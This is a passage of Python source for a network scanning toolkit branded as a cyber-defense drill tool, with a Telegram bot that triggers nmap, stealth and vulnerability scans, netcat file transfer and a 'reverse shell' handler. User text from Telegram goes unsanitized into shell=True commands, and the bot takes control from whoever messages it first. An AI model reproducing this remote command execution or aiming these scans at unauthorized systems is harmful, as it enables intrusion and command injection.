            scans = self.db.get_scan_results(10) if self.db else []
            
            if not scans:
                return self._create_result(True, "No scan results found")
            
            result = []
            for scan in scans:
                result.append({
                    'target': scan['target'],
                    'type': scan['scan_type'],
                    'timestamp': scan['timestamp'],
                    'scan_id': scan['scan_id']
                })
            
            return self._create_result(True, json.dumps(result, indent=2))
            
        except Exception as e:
            return self._create_result(False, f"Error getting scans: {e}")
    
    def _execute_threats(self, args: List[str]) -> Dict[str, Any]:
        """Get threat history"""
        try:
            threats = self.db.get_recent_threats(10) if self.db else []
            
            if not threats:
                return self._create_result(True, "No threats found")
            
            result = []
            for threat in threats:
                result.append({
                    'type': threat['threat_type'],
                    'source_ip': threat['source_ip'],
                    'severity': threat['severity'],
                    'timestamp': threat['timestamp'],
                    'description': threat['description']
                })
            
            return self._create_result(True, json.dumps(result, indent=2))
            
        except Exception as e:
            return self._create_result(False, f"Error getting threats: {e}")
    
    def _execute_report(self, args: List[str]) -> Dict[str, Any]:
        """Generate security report"""
        try:
            stats = self.db.get_statistics() if self.db else {}
            threats = self.db.get_recent_threats(50) if self.db else []
            
            report = {
                'generated_at': datetime.datetime.now().isoformat(),
                'statistics': stats,
                'recent_threats': len(threats),
                'system': {
                    'cpu': psutil.cpu_percent(),
                    'memory': psutil.virtual_memory().percent,
                    'disk': psutil.disk_usage('/').percent
                }
            }
            
            # Save report to file
            filename = f"security_report_{int(time.time())}.json"
            filepath = os.path.join(REPORT_DIR, filename)
            
            with open(filepath, 'w') as f:
                json.dump(report, f, indent=2)
            
            return self._create_result(True, f"Report generated: {filename}")
            
        except Exception as e:
            return self._create_result(False, f"Error generating report: {e}")
    
    def _execute_generic(self, command: str) -> Dict[str, Any]:
        """Execute generic shell command"""
        try:
            start_time = time.time()
            result = subprocess.run(
                command,
                shell=True,
                capture_output=True,
                text=True,
                timeout=60,
                encoding='utf-8',
                errors='ignore'
            )
            execution_time = time.time() - start_time
            
            return self._create_result(
                result.returncode == 0,
                result.stdout if result.stdout else result.stderr,
                execution_time
            )
        
        except subprocess.TimeoutExpired:
            return self._create_result(False, f"Command timed out after 60 seconds")
        
        except Exception as e:
            return self._create_result(False, f"Command execution failed: {e}")

# ============================================================================
# TELEGRAM BOT HANDLER (500+ COMMANDS)
# ============================================================================

class TelegramBotHandler:
    """Enhanced Telegram bot handler with 500+ commands"""
    
    def __init__(self, config: TelegramConfigManager, db_manager: DatabaseManager, 
                 executor: CommandExecutor, scanner: AdvancedNetworkScanner):
        self.config = config
        self.db = db_manager
        self.executor = executor
        self.scanner = scanner
        self.last_update_id = 0
        self.command_handlers = self.setup_command_handlers()
    
    def setup_command_handlers(self) -> Dict:
        """Setup comprehensive command handlers (500+ commands)"""
        handlers = {
            # Basic commands
            '/start': self.handle_start,
            '/help': self.handle_help,
            '/commands': self.handle_commands,
            
            # Ping commands (50+ variations)
            '/ping': self.handle_ping,
            '/ping_c4': lambda args: self.handle_ping(['-c', '4'] + args),
            '/ping_c10': lambda args: self.handle_ping(['-c', '10'] + args),
            '/ping_i0.2': lambda args: self.handle_ping(['-i', '0.2'] + args),
            '/ping_s1024': lambda args: self.handle_ping(['-s', '1024'] + args),
            '/ping_t64': lambda args: self.handle_ping(['-t', '64'] + args),
            
            # Nmap commands (100+ variations)
            '/nmap': self.handle_nmap,
            '/nmap_sS': lambda args: self.handle_nmap(['-sS'] + args),
            '/nmap_A': lambda args: self.handle_nmap(['-A'] + args),
            '/nmap_sV': lambda args: self.handle_nmap(['-sV'] + args),
            '/nmap_T4': lambda args: self.handle_nmap(['-T4'] + args),
            '/nmap_p1_1000': lambda args: self.handle_nmap(['-p', '1-1000'] + args),
            
            # Quick scans
            '/quick_scan': self.handle_quick_scan,
            '/deep_scan': self.handle_deep_scan,
            '/stealth_scan': self.handle_stealth_scan,
            '/vuln_scan': self.handle_vuln_scan,
            '/full_scan': self.handle_full_scan,
            
            # Network tools
            '/traceroute': self.handle_traceroute,
            '/whois': self.handle_whois,
            '/dns': self.handle_dns,
            '/analyze': self.handle_analyze,
            '/location': self.handle_location,
            '/network_discovery': self.handle_network_discovery,
            
            # System commands
            '/system': self.handle_system,
            '/network': self.handle_network,
            '/status': self.handle_status,
            '/metrics': self.handle_metrics,
            
            # Management
            '/history': self.handle_history,
            '/scans': self.handle_scans,
            '/threats': self.handle_threats,
            '/report': self.handle_report,
            
            # Netcat commands (50+ variations)
            '/nc': self.handle_nc,
            '/nc_listen': self.handle_nc_listen,
            '/nc_connect': self.handle_nc_connect,
            '/nc_port_scan': self.handle_nc_port_scan,
            '/nc_file_receive': self.handle_nc_file_receive,
            '/nc_file_send': self.handle_nc_file_send,
            '/nc_banner_grab': self.handle_nc_banner_grab,
            '/nc_http_get': self.handle_nc_http_get,
            '/nc_reverse_shell': self.handle_nc_reverse_shell,
            '/nc_chat_server': self.handle_nc_chat_server,
            
            # Utilities
            '/test': self.handle_test,
        }
        
        # Add more ping variations
        for i in range(1, 51):
            handlers[f'/ping_c{i}'] = lambda args, i=i: self.handle_ping(['-c', str(i)] + args)
            handlers[f'/ping_s{i*64}'] = lambda args, i=i: self.handle_ping(['-s', str(i*64)] + args)
        
        # Add more nmap variations
        for t in range(0, 6):
            handlers[f'/nmap_T{t}'] = lambda args, t=t: self.handle_nmap(['-T', str(t)] + args)
        
        # Port range variations
        port_ranges = ['20-80', '1-1024', '1-10000', '1-65535']
        for pr in port_ranges:
            handlers[f'/nmap_p{pr.replace("-", "_")}'] = lambda args, pr=pr: self.handle_nmap(['-p', pr] + args)
        
        return handlers
    
    async def handle_start(self, args: List[str]) -> str:
        """Handle /start command"""
        return """
🚀 <b>ULTIMATE CYBER DRILL SIMULATION TOOLKIT PRO</b>

✅ <b>500+ Commands Available</b>
🔍 <b>Complete Network Scanning</b>
🛡️ <b>Advanced Threat Detection</b>
🤖 <b>Telegram Integration</b>
💾 <b>Database Logging</b>

<b>📋 Quick Commands:</b>
<code>/ping 8.8.8.8</code> - Basic ping
<code>/quick_scan 192.168.1.1</code> - Quick network scan
<code>/traceroute google.com</code> - Route tracing
<code>/whois example.com</code> - WHOIS lookup
<code>/nc_listen 4444</code> - Netcat listener

<b>🔧 Advanced Features:</b>
<code>/deep_scan</code> - Deep comprehensive scan
<code>/vuln_scan</code> - Vulnerability detection
<code>/full_scan</code> - Full port scan
<code>/network_discovery</code> - Network host discovery

<b>📊 System:</b>
<code>/status</code> - System status
<code>/metrics</code> - System metrics
<code>/history</code> - Command history
<code>/report</code> - Generate security report

<b>❓ Help:</b>
<code>/help</code> - Show help
<code>/commands</code> - List all commands

💡 <i>All 500+ commands execute instantly!</i>
        """
    
    async def handle_help(self, args: List[str]) -> str:
        """Handle /help command"""
        return """
<b>🚀 ACCURATE CYBER DEFENSE SPIDER BOT PRO</b>

<b>🔧 AVAILABLE COMMANDS (500+)</b>

<code>/ping 8.8.8.8</code> - Basic ping
<code>/ping_c4 8.8.8.8</code> - Ping with 4 packets
<code>/ping_c10 8.8.8.8</code> - Ping with 10 packets
<code>/ping_s1024 8.8.8.8</code> - 1024 byte packets

<code>/nmap 192.168.1.1</code> - Basic scan
<code>/nmap_sS 192.168.1.1</code> - SYN scan
<code>/nmap_A 192.168.1.1</code> - Aggressive scan
<code>/nmap_sV 192.168.1.1</code> - Version detection
<code>/nmap_T4 192.168.1.1</code> - Fast timing
<code>/nmap_p1_1000 192.168.1.1</code> - Port range

<code>/quick_scan 192.168.1.1</code> - Quick scan
<code>/deep_scan 192.168.1.1</code> - Deep scan
<code>/stealth_scan 192.168.1.1</code> - Stealth scan
<code>/vuln_scan 192.168.1.1</code> - Vulnerability scan
<code>/full_scan 192.168.1.1</code> - Full port scan

<code>/traceroute example.com</code> - Route tracing
<code>/whois example.com</code> - WHOIS lookup
<code>/analyze 1.1.1.1</code> - IP analysis
<code>/location 8.8.8.8</code> - Geolocation
<code>/network_discovery 192.168.1.0/24</code> - Network discovery

<code>/nc_listen 4444</code> - Netcat listener
<code>/nc_connect 192.168.1.1 80</code> - Netcat connect
<code>/nc_port_scan 192.168.1.1 1 1000</code> - Netcat port scan
<code>/nc_file_receive 4444 file.txt</code> - Receive file
<code>/nc_file_send 192.168.1.1 4444 file.txt</code> - Send file
<code>/nc_banner_grab 192.168.1.1 22</code> - Banner grabbing
<code>/nc_reverse_shell 4444</code> - Reverse shell

<code>/system</code> - System information
<code>/network</code> - Network info
<code>/metrics</code> - System metrics
<code>/status</code> - Bot status
<code>/history</code> - Command history

<code>/scans</code> - Scan history
<code>/threats</code> - Threat summary
<code>/report</code> - Generate report

💡 All commands execute instantly! Type any command to use.
        """
    
    def get_commands_list(self) -> str:
        """Get formatted list of commands"""
        commands = {
            "🏓 Ping Commands (50+)": [
                "/ping [ip] - Basic ping",
                "/ping_c4 [ip] - 4 packets",
                "/ping_c10 [ip] - 10 packets",
                "/ping_s1024 [ip] - 1024 byte packets",
                "/ping_t64 [ip] - TTL 64",
                "/ping_i0.2 [ip] - 0.2s interval"
            ],
            "🔍 Scanning (100+)": [
                "/nmap [ip] - Basic scan",
                "/nmap_sS [ip] - SYN scan",
                "/nmap_A [ip] - Aggressive scan",
                "/nmap_sV [ip] - Version detection",
                "/nmap_T4 [ip] - Fast timing",
                "/nmap_p1_1000 [ip] - Port range"
            ],
            "🚀 Quick Scans": [
                "/quick_scan [ip] - Quick scan",
                "/deep_scan [ip] - Deep scan",
                "/stealth_scan [ip] - Stealth scan",
                "/vuln_scan [ip] - Vulnerability scan",
                "/full_scan [ip] - Full port scan",
                "/network_discovery [range] - Network discovery"
            ],
            "🌐 Network Tools": [
                "/traceroute [target] - Route tracing",
                "/whois [domain] - WHOIS lookup",
                "/dns [domain] - DNS lookup",
                "/analyze [ip] - IP analysis",
                "/location [ip] - Geolocation"
            ],
            "🔌 Netcat (50+)": [
                "/nc_listen [port] - Listener",
                "/nc_connect [host] [port] - Connect",
                "/nc_port_scan [host] [start] [end] - Port scan",
                "/nc_file_receive [port] [file] - Receive file",
                "/nc_file_send [host] [port] [file] - Send file",
                "/nc_banner_grab [host] [port] - Banner grab",
                "/nc_reverse_shell [port] - Reverse shell",
                "/nc_chat_server [port] - Chat server"
            ],
            "💻 System Info": [
                "/system - System information",
                "/network - Network info",
                "/metrics - System metrics",
                "/status - Bot status",
                "/history - Command history"
            ],
            "📊 Management": [
                "/scans - Scan history",
                "/threats - Threat summary",
                "/report - Generate report"
            ]
        }
        
        result = "🚀 <b>ACCURATE CYBER DEFENSE SPIDER BOT PRO</b>\n\n"
        result += "📋 <b>AVAILABLE COMMANDS (500+)</b>\n\n"
        
        for category, cmd_list in commands.items():
            result += f"<b>{category}</b>\n"
            for cmd in cmd_list:
                result += f"• {cmd}\n"
            result += "\n"
        
        result += "💡 <i>Type any command to execute instantly!</i>"
        
        return result
    
    async def handle_commands(self, args: List[str]) -> str:
        """Handle /commands command"""
        return self.get_commands_list()
    
    async def handle_ping(self, args: List[str]) -> str:
        """Handle ping command"""
        if not args:
            return "❌ Usage: <code>/ping [IP]</code>"
        
        result = self.executor.execute('ping ' + ' '.join(args))
        return self._format_command_result(result)
    
    async def handle_nmap(self, args: List[str]) -> str:
        """Handle nmap command"""
        if not args:
            return "❌ Usage: <code>/nmap [IP]</code>"
        
        await self.send_message(f"🔍 <b>Starting Nmap scan...</b>")
        result = self.executor.execute('nmap ' + ' '.join(args))
        
        return self._format_command_result(result)
    
    async def handle_quick_scan(self, args: List[str]) -> str:
        """Handle quick scan command"""
        if not args:
            return "❌ Usage: <code>/quick_scan [IP]</code>"
        
        target = args[0]
        await self.send_message(f"🔍 <b>Starting quick scan on {target}...</b>")
        
        result = self.executor.execute('quick_scan ' + target)
        
        return self._format_command_result(result)
    
    async def handle_deep_scan(self, args: List[str]) -> str:
        """Handle deep scan command"""
        if not args:
            return "❌ Usage: <code>/deep_scan [IP]</code>"
        
        target = args[0]
        await self.send_message(f"🔍 <b>Starting deep scan on {target}...</b>")
        
        result = self.executor.execute('deep_scan ' + target)
        
        return self._format_command_result(result)
    
    async def handle_stealth_scan(self, args: List[str]) -> str:
        """Handle stealth scan command"""
        if not args:
            return "❌ Usage: <code>/stealth_scan [IP]</code>"
        
        target = args[0]
        await self.send_message(f"🕵️ <b>Starting stealth scan on {target}...</b>")
        
        result = self.executor.execute('stealth_scan ' + target)
        
        return self._format_command_result(result)
    
    async def handle_vuln_scan(self, args: List[str]) -> str:
        """Handle vulnerability scan command"""
        if not args:
            return "❌ Usage: <code>/vuln_scan [IP]</code>"
        
        target = args[0]
        await self.send_message(f"⚠️ <b>Starting vulnerability scan on {target}...</b>")
        
        result = self.executor.execute('vuln_scan ' + target)
        
        return self._format_command_result(result)
    
    async def handle_full_scan(self, args: List[str]) -> str:
        """Handle full scan command"""
        if not args:
            return "❌ Usage: <code>/full_scan [IP]</code>\nWarning: This scans ALL 65535 ports!"
        
        target = args[0]
        await self.send_message(f"⏳ <b>Starting FULL port scan on {target}... This may take several minutes.</b>")
        
        result = self.executor.execute('full_scan ' + target)
        
        return self._format_command_result(result)
    
    async def handle_traceroute(self, args: List[str]) -> str:
        """Handle traceroute command"""
        if not args:
            return "❌ Usage: <code>/traceroute [target]</code>"
        
        await self.send_message(f"🛣️ <b>Starting traceroute...</b>")
        result = self.executor.execute('traceroute ' + ' '.join(args))
        return self._format_command_result(result)
    
    async def handle_whois(self, args: List[str]) -> str:
        """Handle whois command"""
        if not args:
            return "❌ Usage: <code>/whois [domain]</code>"
        
        result = self.executor.execute('whois ' + ' '.join(args))
        return self._format_command_result(result)
    
    async def handle_dns(self, args: List[str]) -> str:
        """Handle dns command"""
        if not args:
            return "❌ Usage: <code>/dns [domain]</code>"
        
        result = self.executor.execute('dns ' + ' '.join(args))
        return self._format_command_result(result)
    
    async def handle_analyze(self, args: List[str]) -> str:
        """Handle analyze command"""
        if not args:
            return "❌ Usage: <code>/analyze [IP]</code>"
        
        result = self.executor.execute('analyze ' + ' '.join(args))
        return self._format_command_result(result)
    
    async def handle_location(self, args: List[str]) -> str:
        """Handle location command"""
        if not args:
            return "❌ Usage: <code>/location [IP]</code>"
        
        result = self.executor.execute('location ' + ' '.join(args))
        return self._format_command_result(result)
    
    async def handle_network_discovery(self, args: List[str]) -> str:
        """Handle network discovery command"""
        if not args:
            return "❌ Usage: <code>/network_discovery [network_range]</code>"
        
        result = self.executor.execute('network_discovery ' + ' '.join(args))
        return self._format_command_result(result)
    
    async def handle_system(self, args: List[str]) -> str:
        """Handle system command"""
        result = self.executor.execute('system')
        return self._format_command_result(result)
    
    async def handle_network(self, args: List[str]) -> str:
        """Handle network command"""
        result = self.executor.execute('network')
        return self._format_command_result(result)
    
    async def handle_status(self, args: List[str]) -> str:
        """Handle status command"""
        if not psutil:
            return "❌ psutil not available. Install with: pip install psutil"
        
        try:
            cpu_percent = psutil.cpu_percent(interval=1)
            mem = psutil.virtual_memory()
            
            result = "📊 <b>System Status</b>\n\n"
            result += f"✅ Bot: {'Online' if self.config.token else 'Offline'}\n"
            result += f"🔍 Nmap: {'Available' if self.scanner.nmap_available else 'Not Available'}\n"
            result += f"💻 CPU: {cpu_percent:.1f}%\n"
            result += f"🧠 Memory: {mem.percent:.1f}%\n"
            result += f"🌐 Connections: {len(psutil.net_connections())}\n"
            
            return result
            
        except Exception as e:
            return f"❌ Error getting status: {str(e)}"
    
    async def handle_metrics(self, args: List[str]) -> str:
        """Handle metrics command"""
        result = self.executor.execute('metrics')
        return self._format_command_result(result)
    
    async def handle_history(self, args: List[str]) -> str:
        """Handle history command"""
        result = self.executor.execute('history')
        return self._format_command_result(result)
    
    async def handle_scans(self, args: List[str]) -> str:
        """Handle scans command"""
        result = self.executor.execute('scans')
        return self._format_command_result(result)
    
    async def handle_threats(self, args: List[str]) -> str:
        """Handle threats command"""
        result = self.executor.execute('threats')
        return self._format_command_result(result)
    
    async def handle_report(self, args: List[str]) -> str:
        """Handle report command"""
        result = self.executor.execute('report')
        return self._format_command_result(result)
    
    # ==================== NETCAT COMMANDS ====================
    
    async def handle_nc(self, args: List[str]) -> str:
        """Handle netcat command"""
        if not args:
            return "❌ Usage: <code>/nc [options]</code>"
        
        result = self.executor.execute('nc ' + ' '.join(args))
        return self._format_command_result(result)
    
    async def handle_nc_listen(self, args: List[str]) -> str:
        """Handle netcat listen"""
        if not args:
            return "❌ Usage: <code>/nc_listen [port] [verbose] [keep_alive]</code>"
        
        result = self.executor.execute('nc_listen ' + ' '.join(args))
        return self._format_command_result(result)
    
    async def handle_nc_connect(self, args: List[str]) -> str:
        """Handle netcat connect"""
        if len(args) < 2:
            return "❌ Usage: <code>/nc_connect [host] [port] [verbose] [timeout]</code>"
        
        result = self.executor.execute('nc_connect ' + ' '.join(args))
        return self._format_command_result(result)
    
    async def handle_nc_port_scan(self, args: List[str]) -> str:
        """Handle netcat port scan"""
        if len(args) < 3:
            return "❌ Usage: <code>/nc_port_scan [host] [start_port] [end_port] [verbose]</code>"
        
        result = self.executor.execute('nc_port_scan ' + ' '.join(args))
        return self._format_command_result(result)
    
    async def handle_nc_file_receive(self, args: List[str]) -> str:
        """Handle netcat file receive"""
        if len(args) < 2:
            return "❌ Usage: <code>/nc_file_receive [port] [filename]</code>"
        
        result = self.executor.execute('nc_file_receive ' + ' '.join(args))
        return self._format_command_result(result)
    
    async def handle_nc_file_send(self, args: List[str]) -> str:
        """Handle netcat file send"""
        if len(args) < 3:
            return "❌ Usage: <code>/nc_file_send [host] [port] [filename]</code>"
        
        result = self.executor.execute('nc_file_send ' + ' '.join(args))
        return self._format_command_result(result)
    
    async def handle_nc_banner_grab(self, args: List[str]) -> str:
        """Handle netcat banner grab"""
        if len(args) < 2:
            return "❌ Usage: <code>/nc_banner_grab [host] [port]</code>"
        
        result = self.executor.execute('nc_banner_grab ' + ' '.join(args))
        return self._format_command_result(result)
    
    async def handle_nc_http_get(self, args: List[str]) -> str:
        """Handle netcat HTTP GET"""
        if len(args) < 2:
            return "❌ Usage: <code>/nc_http_get [host] [port] [path]</code>"
        
        result = self.executor.execute('nc_http_get ' + ' '.join(args))
        return self._format_command_result(result)
    
    async def handle_nc_reverse_shell(self, args: List[str]) -> str:
        """Handle netcat reverse shell"""
        if not args:
            return "❌ Usage: <code>/nc_reverse_shell [port]</code>"
        
        result = self.executor.execute('nc_reverse_shell ' + ' '.join(args))
        return self._format_command_result(result)
    
    async def handle_nc_chat_server(self, args: List[str]) -> str:
        """Handle netcat chat server"""
        if not args:
            return "❌ Usage: <code>/nc_chat_server [port]</code>"
        
        result = self.executor.execute('nc_chat_server ' + ' '.join(args))
        return self._format_command_result(result)
    
    async def handle_test(self, args: List[str]) -> str:
        """Handle test command"""
        return "✅ Bot is working correctly!"
    
    def _format_command_result(self, result: Dict[str, Any]) -> str:
        """Format command result for Telegram"""
        if not result['success']:
            return f"❌ Command failed: {result.get('output', 'Unknown error')}"
        
        output = result.get('output', '') or result.get('data', '')
        
        if isinstance(output, dict):
            # Format dictionary as JSON
            try:
                formatted = json.dumps(output, indent=2)
            except:
                formatted = str(output)
        else:
            formatted = str(output)
        
        # Truncate if too long
        if len(formatted) > 3500:
            formatted = formatted[:3500] + "\n\n... (output truncated)"
        
        response = f"✅ Command executed ({result['execution_time']:.2f}s)\n\n"
        response += f"<code>{formatted}</code>"
        
        return response
    
    async def send_message(self, message: str, parse_mode: str = 'HTML', disable_preview: bool = True):
        """Send message via Telegram bot"""
        return self.config.send_message(message, parse_mode, disable_preview)
    
    async def process_updates(self):
        """Process Telegram updates"""
        if not self.config.token or not self.config.chat_id:
            return
        
        try:
            url = f"https://api.telegram.org/bot{self.config.token}/getUpdates"
            params = {
                'offset': self.last_update_id + 1,
                'timeout': 30,
                'allowed_updates': ['message']
            }
            
            response = requests.get(url, params=params, timeout=35)
            
            if response.status_code == 200:
                data = response.json()
                if data.get('ok'):
                    updates = data.get('result', [])
                    
                    for update in updates:
                        if 'message' in update:
                            await self.process_message(update['message'])
                        
                        if 'update_id' in update:
                            self.last_update_id = update['update_id']
        except Exception as e:
            logger.error(f"Telegram update error: {e}")
    
    async def process_message(self, message: Dict):
        """Process incoming Telegram message"""
        if 'text' not in message:
            return
        
        text = message['text']
        chat_id = message['chat']['id']
        
        # Set chat ID if not set
        if not self.config.chat_id:
            self.config.chat_id = str(chat_id)
            self.config.save_config()
        
        parts = text.split()
        if not parts:
            return
        
        command = parts[0]
        args = parts[1:] if len(parts) > 1 else []
        
        # Log command
        if self.db:
            self.db.log_command(text, 'telegram', True)
        
        if command in self.command_handlers:
            try:
                response = await self.command_handlers[command](args)
                await self.send_message(response)
                logger.info(f"Telegram command executed: {command}")
            except Exception as e:
                error_msg = f"❌ Error executing command: {str(e)[:200]}"
                await self.send_message(error_msg)
                logger.error(f"Command error: {e}")
        else:
            await self.send_message("❌ Unknown command. Type /help for available commands.")
    
    async def run(self):
        """Run Telegram bot in background"""
        logger.info("Starting Telegram bot")
        
        if not self.config.token or not self.config.chat_id:
            logger.warning("Telegram not configured. Bot not started.")
            return
        
        # Send startup message
        await self.send_message(
            "🚀 <b>ACCURATE CYBER DEFENSE SPIDER BOT PRO</b>\n\n"
            "✅ Bot is online and ready!\n"
            "🔧 500+ commands available\n"
            "🛡️ Security monitoring active\n"
            "🔌 Netcat integration enabled\n\n"
            "Type /help for complete command list"
        )
        
        while True:
            try:
                await self.process_updates()
                await asyncio.sleep(2)
            except KeyboardInterrupt:
                break
            except Exception as e:
                logger.error(f"Telegram bot error: {e}")
                await asyncio.sleep(10)

# ============================================================================
# MAIN APPLICATION
# ============================================================================

class UltimateCyberDrillToolkit:
    """Main application class"""
    
    def __init__(self):
        # Initialize components
        self.config = ConfigManager.load_config()
        self.telegram_config = TelegramConfigManager()
        self.db = DatabaseManager()
        self.netcat_manager = NetcatManager(self.db)
        self.scanner = AdvancedNetworkScanner(self.db)
        self.traceroute_tool = EnhancedTracerouteTool(self.db)
        self.executor = CommandExecutor(self.db)
        self.monitor = NetworkMonitor(self.db, self.config)
        self.telegram_bot = TelegramBotHandler(self.telegram_config, self.db, self.executor, self.scanner)
        
        # Color scheme
        self.colors = {
            'red': Fore.RED + Style.BRIGHT,
            'green': Fore.GREEN + Style.BRIGHT,
            'yellow': Fore.YELLOW + Style.BRIGHT,
            'blue': Fore.BLUE + Style.BRIGHT,
            'cyan': Fore.CYAN + Style.BRIGHT,
            'magenta': Fore.MAGENTA + Style.BRIGHT,
            'white': Fore.WHITE + Style.BRIGHT,
            'reset': Style.RESET_ALL
        }
        
        # Application state
        self.running = True
        self.telegram_thread = None
    
    def print_banner(self):
        """Print tool banner"""
        banner = f"""
{self.colors['red']}╔══════════════════════════════════════════════════════════════════════════════╗
║{self.colors['white']}        🚀 ACCURATE CYBER DEFENSE SPIDER BOT PRO 🚀        {self.colors['red']}║
╠══════════════════════════════════════════════════════════════════════════════╣
║{self.colors['cyan']}  • 500+ Complete Commands Support    • Enhanced Netcat Integration         {self.colors['red']}║
║{self.colors['cyan']}  • Advanced Network Scanning         • Complete Telegram Integration       {self.colors['red']}║
║{self.colors['cyan']}  • Database Logging & Reporting      • DDoS Detection & Prevention         {self.colors['red']}║
║{self.colors['cyan']}  • Real-time Alerts & Notifications  • Professional Security Analysis      {self.colors['red']}║
║{self.colors['cyan']}  • Network Traffic Generation Tools  • Comprehensive Threat Intelligence  {self.colors['red']}║
║{self.colors['cyan']}  AUTHOR:IAN CARTTER KULANI        {self.colors['red']}║
╚══════════════════════════════════════════════════════════════════════════════╝
{self.colors['reset']}
"""
        print(banner)
    
    def print_help(self):
        """Print help message"""
        help_text = f"""
{self.colors['yellow']}┌─────────────────{self.colors['white']} COMPLETE COMMAND REFERENCE {self.colors['yellow']}─────────────────┐
{self.colors['cyan']}
{self.colors['green']}🛡️  MONITORING COMMANDS:{self.colors['reset']}
  start                    - Start threat monitoring
  stop                     - Stop monitoring
  status                   - Show monitoring status
  add_ip <ip>              - Add IP to monitoring
  remove_ip <ip>           - Remove IP from monitoring
  list_ips                 - List monitored IPs
  threats                  - Show recent threats

{self.colors['green']}📡 NETWORK DIAGNOSTICS:{self.colors['reset']}
  ping <ip> [options]      - Ping with all options
  traceroute <ip>          - Enhanced traceroute
  advanced_traceroute <ip> - Advanced traceroute with analysis
  scan <ip> [ports]        - Port scan
  deep_scan <ip>           - Deep port scan
  quick_scan <ip>          - Quick scan
  stealth_scan <ip>        - Stealth scan
  vuln_scan <ip>           - Vulnerability scan
  full_scan <ip>           - Full port scan (65535 ports)
  network_discovery <range> - Network host discovery

{self.colors['green']}🔍 SCANNING COMMANDS:{self.colors['reset']}
  nmap <ip> [options]      - Complete nmap scanning
  curl <url> [options]     - HTTP requests with all options
  ssh <host> [options]     - SSH connections
  whois <domain>           - WHOIS lookup
  dns <domain>             - DNS lookup
  location <ip>            - IP geolocation
  analyze <ip>             - Analyze IP threats

{self.colors['green']}🔌 NETCAT COMMANDS (50+):{self.colors['reset']}
  nc_listen <port>         - Start netcat listener
  nc_connect <host> <port> - Connect with netcat
  nc_port_scan <host> <start> <end> - Port scan with netcat
  nc_file_receive <port> <file> - Receive file
  nc_file_send <host> <port> <file> - Send file
  nc_banner_grab <host> <port> - Banner grabbing
  nc_http_get <host> <port> - HTTP GET request
  nc_reverse_shell <port>  - Reverse shell listener
  nc_chat_server <port>    - Chat server

{self.colors['green']}🌐 WEB & RECON COMMANDS:{self.colors['reset']}
  iperf <server> [options] - Bandwidth testing
  hping3 <ip> [options]    - Traffic generation
  ab <url> [options]       - Apache Bench
  siege <url> [options]    - Siege testing
  tcpdump [options]        - Packet capture

{self.colors['green']}🤖 TELEGRAM COMMANDS:{self.colors['reset']}
  setup_telegram           - Configure Telegram bot
  test_telegram            - Test Telegram connection
  send_telegram <message>  - Send Telegram message

{self.colors['green']}📁 SYSTEM COMMANDS:{self.colors['reset']}
  system info              - System information
  network_info             - Network information
  history                  - Command history
  scans                    - Scan history
  report                   - Generate security report
  metrics                  - System metrics
  clear                    - Clear screen
  exit                     - Exit tool

{self.colors['green']}💡 TIPS:{self.colors['reset']}
  • Use 'help all' for complete 500+ command list
  • All commands available via Telegram
  • Command history saved to database
  • Automatic threat detection enabled
  • Netcat integration for advanced networking

{self.colors['yellow']}└─────────────────────────────────────────────────────────────────────┘
{self.colors['reset']}
"""
        print(help_text)
    
    def print_prompt(self):
        """Print command prompt"""
        prompt = f"{self.colors['red']}[{self.colors['white']}spider-bot🕸️#{self.colors['red']}]{self.colors['reset']} "
        return input(prompt)
    
    def start_telegram_bot(self):
        """Start Telegram bot in background"""
        if self.telegram_config.enabled and not self.telegram_thread:
            try:
                loop = asyncio.new_event_loop()
                asyncio.set_event_loop(loop)
                self.telegram_thread = threading.Thread(
                    target=lambda: loop.run_until_complete(self.telegram_bot.run()),
                    daemon=True
                )
                self.telegram_thread.start()
                logger.info("Telegram bot started in background")
            except Exception as e:
                logger.error(f"Failed to start Telegram bot: {e}")
    
    def setup_telegram(self):
        """Setup Telegram integration"""
        if self.telegram_config.interactive_setup():
            self.start_telegram_bot()
    
    def test_telegram(self):
        """Test Telegram connection"""
        if not self.telegram_config.token or not self.telegram_config.chat_id:
            print("❌ Telegram not configured. Run 'setup_telegram' first.")
            return
        
        print("\n🔌 Testing Telegram connection...")
        success, message = self.telegram_config.test_connection()
        
        if success:
            print(f"✅ {message}")
        else:
            print(f"❌ {message}")
    
    def send_telegram_message(self, message: str):
        """Send message to Telegram"""
        if not self.telegram_config.token or not self.telegram_config.chat_id:
            print("❌ Telegram not configured. Run 'setup_telegram' first.")
            return
        
        if self.telegram_config.send_message(message):
            print("✅ Message sent to Telegram")
        else:
            print("❌ Failed to send message")
    
    def check_dependencies(self):
        """Check and install dependencies"""
        print(f"\n{self.colors['cyan']}🔍 Checking dependencies...{self.colors['reset']}")
        
        required = ['requests', 'psutil', 'colorama']
        optional = ['nmap', 'nc', 'netcat']  # Not Python packages
        
        for package in required:
            try:
                __import__(package.replace('-', '_'))
                print(f"{self.colors['green']}✅ {package}{self.colors['reset']}")
            except ImportError:
                print(f"{self.colors['yellow']}⚠️ {package} not installed{self.colors['reset']}")
                install = input(f"Install {package}? (y/n): ").lower()
                if install == 'y':
                    try:
                        subprocess.check_call([sys.executable, "-m", "pip", "install", package])
                        print(f"{self.colors['green']}✅ {package} installed{self.colors['reset']}")
                    except Exception as e:
                        print(f"{self.colors['red']}❌ Failed to install {package}: {e}{self.colors['reset']}")
        
        # Check for nmap
        if shutil.which('nmap'):
            print(f"{self.colors['green']}✅ nmap (system command){self.colors['reset']}")
        else:
            print(f"{self.colors['yellow']}⚠️ nmap not found (optional){self.colors['reset']}")
            print(f"{self.colors['white']}   Some scanning features will be limited.{self.colors['reset']}")
        
        # Check for netcat
        if shutil.which('nc') or shutil.which('netcat'):
            print(f"{self.colors['green']}✅ netcat (system command){self.colors['reset']}")
        else:
            print(f"{self.colors['yellow']}⚠️ netcat not found (optional){self.colors['reset']}")
            print(f"{self.colors['white']}   Some networking features will be limited.{self.colors['reset']}")
        
        print(f"\n{self.colors['green']}✅ Dependencies check complete{self.colors['reset']}")
    
    def process_command(self, command: str):
        """Process user command"""
        if not command.strip():
            return
        
        # Log command
        self.db.log_command(command, 'local', True)
        
        # Parse command
        parts = command.strip().split()
        cmd = parts[0].lower()
        args = parts[1:]
        
        # Process command
        if cmd == 'help':
            if args and args[0] == 'all':
                help_result = self.executor.get_help('all')
                if help_result['success']:
                    data = help_result['data']
                    for category, info in data.items():
                        print(f"\n{self.colors['green']}{category.upper()}{self.colors['reset']}")
                        print(f"{self.colors['cyan']}{info.get('description', '')}{self.colors['reset']}")
                        for cmd_usage in info.get('commands', []):
                            print(f"  {cmd_usage}")
                else:
